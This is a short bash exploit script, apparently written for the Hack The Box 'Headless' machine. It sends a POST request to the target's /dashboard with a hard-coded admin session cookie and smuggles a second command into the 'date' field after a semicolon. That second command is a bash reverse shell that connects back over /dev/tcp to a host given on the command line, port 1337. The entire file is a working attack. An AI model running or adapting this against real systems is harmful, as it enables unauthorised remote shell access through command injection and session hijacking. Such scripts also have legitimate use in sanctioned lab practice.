#!/bin/bash

rhost=${1}
bashi="bash -c 'bash -i >& /dev/tcp/${rhost}/1337 0>&1'"
admin_cookie="ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0"

curl -X POST http://headless.htb:5000/dashboard \
  --data-urlencode "date=1-2-3;${bashi}" \
  -H "Cookie: is_admin=${admin_cookie}"
